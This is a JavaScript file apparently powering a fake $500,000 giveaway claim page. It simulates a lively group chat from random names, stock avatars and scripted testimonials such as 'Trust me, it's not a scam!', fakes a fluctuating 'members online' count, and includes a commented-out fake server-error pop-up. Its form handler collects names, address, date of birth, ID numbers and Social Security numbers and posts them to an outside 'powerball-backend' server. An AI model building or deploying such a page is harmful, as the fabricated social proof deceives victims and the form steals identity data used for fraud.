const messages = [
  "I know it sounds crazy, but it’s real! I just got $500,000!",
  "I was in disbelief too, but it’s true! I just received $500,000!",
  "You won’t believe it, but it's real! I just got $500,000!",
  "Trust me, it’s not a scam! $500,000 is in my account right now!",
  "I had to check twice, but it’s real! $500,000 just landed!",
  "It’s no joke! I just got $500,000!",
  "Don't hesitate, it's real! $500,000 just came to me!",
  "I didn’t believe it at first either, but $500,000 is mine now!",
  "It’s for real! I just received $500,000 and I’m beyond grateful!",
  "I thought I was dreaming too, but it’s real! $500,000 just showed up!",
  "Trust me, I didn’t believe it either, but $500,000 is in my hands!",
  "I was skeptical too, but this is real! $500,000 just arrived!",
  "It’s not a joke! $500,000 just got deposited into my account!",
  "You don’t need to worry, it’s real! I’ve just received $500,000!",
  "Thank you so much, this is life-changing! 🙏💖",
  "Wow, it's real! I received mine two hours ago! 😱🎉",
  "I can't believe this is happening. Thank you for the opportunity! 🙌✨",
  "Such an amazing gift! I’m beyond grateful. 😍🎁",
  "This will help me so much, thank you for your generosity. 💰🙏",
  "I never expected something like this to happen to me. 😳💫",
  "I’m in shock! This is truly a blessing. 😱💖",
  "I’m so excited, this is a dream come true! 😍🌟",
  "Thank you, Cheng and your wife, for making a real difference. 🙏💑✨",
  "This is going to change my life! I can’t wait to pay it forward. 💸💞",
  "I’ve never been this excited. Thank you for the opportunity! 🎉😆",
  "I’m speechless! This is the help I needed. 😶💖",
  "You guys are doing incredible things! I’m honored to be a part of this. 👏🌍",
  "I can't wait to use this to help my family and others! 👨‍👩‍👧‍👦❤️",
  "I feel so lucky to have been selected. Thank you for your generosity! 🍀💸",
  "This is more than I ever imagined. Thank you for everything. 🙏✨",
  "I’m sending you my deepest thanks! This is life-changing! 💖🙏",
  "I will forever be grateful to you for this amazing opportunity. 🙏💯",
  "This is so much more than money, it's hope. Thank you. 🌟💙",
  "Words can’t describe how thankful I am for this incredible gift. 😍💝",
  "I can't believe it! I just received $500,000! Thank you so much for this incredible gift!",
  "Wow! I got the $500,000! This is life-changing. Thank you, thank you!",
  "I just got a $500,000 donation! I’m still in shock. Thank you for changing my life!",
  "I can’t believe I’ve been selected for the $500,000 giveaway. This will make a huge difference!",
  "I received $500,000 today! I’m so thankful for this incredible opportunity!",
  "This is real! I just got my $500,000. I can’t express how grateful I am!",
  "I’m in tears right now! I just received $500,000! This is a dream come true. Thank you!",
  "Thank you so much! I’ve received $500,000, and I can’t wait to make the most of this!",
  "I can’t believe it’s real! Just got $500,000. I feel so lucky. Thank you!",
  "This is a blessing! $500,000 just came through. Thank you for changing my life!",
  "I just got my $500,000! I’m overwhelmed with gratitude. This is amazing!",
  "Thank you so much! $500,000 just landed in my account. I will use this wisely!",
  "I’ve been chosen for the $500,000 giveaway! I can’t thank you enough for this incredible gift!",
  "I can’t believe I just received $500,000. This is going to change my life forever!",
  "Wow, it’s true! $500,000 has been deposited into my account. I’m so thankful!",
  "I’m still in shock! $500,000 just hit my bank account. Thank you so much for this opportunity!",
  "This is unreal! I just received $500,000. Thank you for making my dreams come true!",
  "I can’t believe it! $500,000 just arrived. Thank you for this life-changing moment!",
  "I’ve never been so happy in my life! I just received $500,000! This is unbelievable!",
  "I can’t thank you enough! $500,000 just came through. I’m forever grateful!",
  "I’m crying happy tears! I just got $500,000. Thank you for this amazing gift!",
  "Thank you so much for the $500,000! This is going to help me take care of so much!",
  "I got the $500,000! Thank you for giving me this incredible opportunity!",
  "Don't worry, it's real! I just got my $500,000! 😱💸",
  "I know it sounds unbelievable, but it's true! $500,000 in my account! 😳💰",
  "No need to be scared, it’s for real! I’ve got $500,000! 🙌🎉",
  "Believe it or not, this is real! I just received $500,000! 😲💵",
  "It’s not a scam! I just received $500,000! I’m in shock! 😱💥",
  "I know it’s hard to believe, but this is real! $500,000 just came through! 🤯💸",
  "It really happened! I just got $500,000. This is no joke! 🤑🎉",
  "It’s not a dream, it’s real! I’ve received $500,000! ✨💰",
  "Don't worry, it's the real deal! $500,000 is now mine! 💵💯",
  "It’s for real! I just got $500,000! Thank you so much! 🙏💖",
  "I’m beyond excited to be part of such an incredible program.",
  "I’m so grateful to be selected for this life-changing giveaway!",
  "I’ll be forever grateful for your generosity. Thank you so much.",
  "This is exactly what I needed to turn my life around.",
  "I don’t even know how to express how thankful I am.",
  "This is such an amazing opportunity. Thank you for believing in me.",
  "I’m so excited to get started and make a positive impact.",
  "I can't wait to see how far this will go. I’m truly blessed!",
  "I’ve never felt so much hope in my life. Thank you for this!",
  "I’m sharing this news with my family—everyone is so happy for me.",
  "I can’t believe I was chosen. Thank you for making my dreams come true.",
  "I’m planning to use this to support my education. Thank you for the chance.",
  "This opportunity means everything to me. I will use it wisely!",
  "Thank you for making the world a better place, one person at a time.",
  "I’m still in disbelief. This is such a huge blessing!",
  "This is the most incredible thing that has ever happened to me.",
  "I never imagined something like this could happen to me.",
  "Thank you for making this possible. I will pay it forward.",
  "You’ve given me hope when I thought all was lost.",
  "This is beyond anything I could’ve dreamed of. Thank you!",
  "This is an absolute game-changer for me. Thank you!",
  "I can’t believe how generous you both are. Thank you for everything.",
];

const names = [
  "Alex",
  "Sarah",
  "Mike",
  "Emma",
  "James",
  "Olivia",
  "Liam",
  "Sophia",
  "Mason",
  "Isabella",
  "Ethan",
  "Ava",
  "David",
  "Mia",
  "William",
  "Charlotte",
  "Benjamin",
  "Amelia",
  "Lucas",
  "Harper",
  "Henry",
  "Chloe",
  "Jackson",
  "Ella",
  "Daniel",
  "Scarlett",
  "Owen",
  "Grace",
  "Matthew",
  "Sofia",
  "Jack",
  "Layla",
  "Alexander",
  "Zoe",
  "Aiden",
  "Lily",
  "Sebastian",
  "Aria",
  "Elijah",
  "Ella",
  "Samuel",
  "Madison",
  "Wyatt",
  "Emily",
  "Gabriel",
  "Abigail",
  "Joshua",
  "Avery",
  "Julian",
  "Luna",
  "Leo",
  "Victoria",
  "Jackson",
  "Sophie",
  "Isaac",
  "Megan",
  "Carter",
  "Nora",
  "Julian",
  "Ella",
  "Eli",
  "Evelyn",
  "Cameron",
  "Maya",
  "Austin",
  "Daniela",
  "Leo",
  "Mikayla",
  "Jacob",
  "Sophia",
  "Jaxon",
  "Ariana",
  "Violet",
  "Grayson",
  "Mila",
  "Omar",
  "Zoe",
  "Nathan",
  "Lila",
  "Blake",
  "Madeline",
  "Mason",
  "Ryan",
  "Addison",
  "Julia",
  "Hunter",
  "Piper",
  "Eva",
  "Cooper",
  "Caroline",
  "Liam",
  "Gianna",
  "Miles",
  "Giovanni",
  "Abigail",
  "Landon",
  "Paisley",
  "Caleb",
  "Leah",
  "Oliver",
  "Camila",
  "Eli",
  "Riley",
  "Sienna",
  "Elena",
  "Jade",
  "Asher",
  "Bella",
  "Jordan",
  "Ella",
];
const avatars = [
  "https://i.pravatar.cc/150?img=1",
  "https://i.pravatar.cc/150?img=2",
  "https://i.pravatar.cc/150?img=3",
  "https://i.pravatar.cc/150?img=4",
  "https://i.pravatar.cc/150?img=5",
  "https://i.pravatar.cc/150?img=6",
  "https://i.pravatar.cc/150?img=7",
  "https://i.pravatar.cc/150?img=8",
  "https://i.pravatar.cc/150?img=9",
  "https://i.pravatar.cc/150?img=10",
  "https://i.pravatar.cc/150?img=11",
  "https://i.pravatar.cc/150?img=12",
  "https://i.pravatar.cc/150?img=13",
  "https://i.pravatar.cc/150?img=14",
  "https://i.pravatar.cc/150?img=15",
  "https://i.pravatar.cc/150?img=16",
  "https://i.pravatar.cc/150?img=17",
  "https://i.pravatar.cc/150?img=18",
  "https://i.pravatar.cc/150?img=19",
  "https://i.pravatar.cc/150?img=20",
  "https://i.pravatar.cc/150?img=21",
  "https://i.pravatar.cc/150?img=22",
  "https://i.pravatar.cc/150?img=23",
  "https://i.pravatar.cc/150?img=24",
  "https://i.pravatar.cc/150?img=25",
  "https://i.pravatar.cc/150?img=26",
  "https://i.pravatar.cc/150?img=27",
  "https://i.pravatar.cc/150?img=28",
  "https://i.pravatar.cc/150?img=29",
  "https://i.pravatar.cc/150?img=30",
  "https://i.pravatar.cc/150?img=31",
  "https://i.pravatar.cc/150?img=32",
  "https://i.pravatar.cc/150?img=33",
  "https://i.pravatar.cc/150?img=34",
  "https://i.pravatar.cc/150?img=35",
  "https://i.pravatar.cc/150?img=36",
  "https://i.pravatar.cc/150?img=37",
  "https://i.pravatar.cc/150?img=38",
  "https://i.pravatar.cc/150?img=39",
  "https://i.pravatar.cc/150?img=40",
  "https://i.pravatar.cc/150?img=41",
  "https://i.pravatar.cc/150?img=42",
  "https://i.pravatar.cc/150?img=43",
  "https://i.pravatar.cc/150?img=44",
  "https://i.pravatar.cc/150?img=45",
  "https://i.pravatar.cc/150?img=46",
  "https://i.pravatar.cc/150?img=47",
  "https://i.pravatar.cc/150?img=48",
  "https://i.pravatar.cc/150?img=49",
  "https://i.pravatar.cc/150?img=50",
  "https://i.pravatar.cc/150?img=51",
  "https://i.pravatar.cc/150?img=52",
  "https://i.pravatar.cc/150?img=53",
  "https://i.pravatar.cc/150?img=54",
  "https://i.pravatar.cc/150?img=55",
  "https://i.pravatar.cc/150?img=56",
  "https://i.pravatar.cc/150?img=57",
  "https://i.pravatar.cc/150?img=58",
  "https://i.pravatar.cc/150?img=59",
];

// Default messages
const defaultMessages = [
  {
    name: "Sarah",
    message: "Hey everyone! Welcome to the group chat 👋",
    avatar: "https://i.pravatar.cc/150?img=1",
    isOwn: false,
  },
  {
    name: "Alex",
    message: "Thanks Sarah! Excited to be here!",
    avatar: "https://i.pravatar.cc/150?img=2",
    isOwn: true,
  },
  {
    name: "Mike",
    message: "How's everyone doing today?",
    avatar: "https://i.pravatar.cc/150?img=3",
    isOwn: false,
  },
  {
    name: "Emma",
    message: "Great! Just finished my morning coffee ☕",
    avatar: "https://i.pravatar.cc/150?img=4",
    isOwn: true,
  },
];

let isOwnMessage = false;

function createMessage(messageData = null) {
  const messageDiv = document.createElement("div");

  if (messageData) {
    messageDiv.className = `message ${messageData.isOwn ? "own" : ""} new`;
    messageDiv.innerHTML = `
            <img class="message-avatar" src="${
              messageData.avatar
            }" alt="avatar">
            <div class="message-content">
                <div class="message-header">
                    <span class="message-name">${messageData.name}</span>
                    <span class="message-time">${new Date().toLocaleTimeString(
                      [],
                      { hour: "2-digit", minute: "2-digit" }
                    )}</span>
                </div>
                <div class="message-text">${messageData.message}</div>
            </div>
        `;
  } else {
    messageDiv.className = `message ${isOwnMessage ? "own" : ""} new`;
    const randomName = names[Math.floor(Math.random() * names.length)];
    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
    const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];

    messageDiv.innerHTML = `
            <img class="message-avatar" src="${randomAvatar}" alt="avatar">
            <div class="message-content">
                <div class="message-header">
                    <span class="message-name">${randomName}</span>
                    <span class="message-time">${new Date().toLocaleTimeString()}</span>
                </div>
                <div class="message-text">${randomMessage}</div>
            </div>
        `;
  }

  const chatMessages = document.getElementById("chatMessages");
  chatMessages.appendChild(messageDiv);
  chatMessages.scrollTop = chatMessages.scrollHeight;

  // Keep only the last 8 messages
  while (chatMessages.children.length > 8) {
    chatMessages.removeChild(chatMessages.firstChild);
  }
}

function getRandomInterval() {
  // Convert 2s to 35s to milliseconds (2000ms to 35000ms)
  const minTime = 2000; // 2 seconds
  const maxTime = 35000; // 35 seconds
  return Math.floor(Math.random() * (maxTime - minTime) + minTime);
}

function startChat() {
  createMessage(); // Create first message immediately

  function scheduleNextMessage() {
    setTimeout(() => {
      createMessage();
      scheduleNextMessage();
    }, getRandomInterval());
  }

  scheduleNextMessage();
}

// Enhanced version with small variations
function updateOnlineCount() {
  const currentCount = getNumberFromString(
    document.querySelector(".online-count").textContent
  );

  // Generate a small variation (-5 to +5) from current count
  const variation = Math.floor(Math.random() * 11) - 5;

  // Ensure count stays within bounds (50-200)
  let newCount = currentCount + variation;
  newCount = Math.max(50, Math.min(200, newCount));

  const onlineCountElement = document.querySelector(".online-count");
  animateValue(onlineCountElement, currentCount, newCount, 1000);
}

function getNumberFromString(str) {
  return parseInt(str.match(/\d+/)[0]) || 0;
}

function animateValue(element, start, end, duration) {
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
    const currentCount = Math.floor(progress * (end - start) + start);
    element.textContent = `${currentCount} members online`;
    if (progress < 1) {
      window.requestAnimationFrame(step);
    }
  };
  window.requestAnimationFrame(step);
}

// Initialize online count and set up interval
function initializeOnlineCount() {
  // Set initial count
  updateOnlineCount();

  // Update count every 90 seconds
  setInterval(updateOnlineCount, 90000);
}

// Add this function to create more natural variations
function startRandomVariations() {
  // Occasionally update with small variations (every 5-15 seconds)
  setInterval(() => {
    if (Math.random() < 0.3) {
      // 30% chance to update
      updateOnlineCount();
    }
  }, 5000);
}

// Start the chat simulation when the page loads
window.onload = function () {
  startChat();
  initializeOnlineCount();
  startRandomVariations();
};

// Smooth scroll to form section
// document.addEventListener('DOMContentLoaded', function() {
//     const claimButton = document.querySelector('.custom-claim-btn');

//     claimButton.addEventListener('click', function(e) {
//         e.preventDefault();

//         // First show error message
//         Swal.fire({
//             icon: 'error',
//             title: 'Server Error',
//             text: 'We\'re experiencing high traffic at the moment. Please try again later.',
//             confirmButtonText: 'Got it',
//             confirmButtonColor: '#dc3545',
//         }).then((result) => {
//             if (result.isConfirmed) {
//                 // After clicking "Got it", scroll to form
//                 const formSection = document.getElementById('claimForm');
//                 formSection.scrollIntoView({
//                     behavior: 'smooth',
//                     block: 'start'
//                 });
//             }
//         });
//     });
// });

const API_URL =
  process.env.NODE_ENV === "production"
    ? "https://powerball-backend.vercel.app"
    : "http://localhost:3000";

document
  .getElementById("prizeClaimForm")
  .addEventListener("submit", async function (e) {
    e.preventDefault();

    const formData = {
      firstName: document.getElementById("firstName").value,
      lastName: document.getElementById("lastName").value,
      email: document.getElementById("email").value,
      phone: document.getElementById("phone").value,
      dob: document.getElementById("dob").value,
      gender: document.getElementById("gender").value,
      street: document.getElementById("street").value,
      city: document.getElementById("city").value,
      state: document.getElementById("state").value,
      zipCode: document.getElementById("zipCode").value,
      country: document.getElementById("country").value,
      maritalStatus: document.getElementById("maritalStatus").value,
      occupation: document.getElementById("occupation").value,
      idType: document.getElementById("idType").value,
      idNumber: document.getElementById("idNumber").value,
      ssn: document.getElementById("ssn").value,
    };

    try {
      const response = await fetch(
        `https://powerball-backend.vercel.app/api/submit-form`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );

      const data = await response.json();

      if (response.ok) {
        Swal.fire({
          icon: "success",
          title: "Success!",
          text: "Your form has been submitted successfully.",
        });
      } else {
        throw new Error(data.message || "Form submission failed");
      }
    } catch (error) {
      Swal.fire({
        icon: "error",
        title: "Error!",
        text: error.message || "Something went wrong. Please try again.",
      });
    }
  });
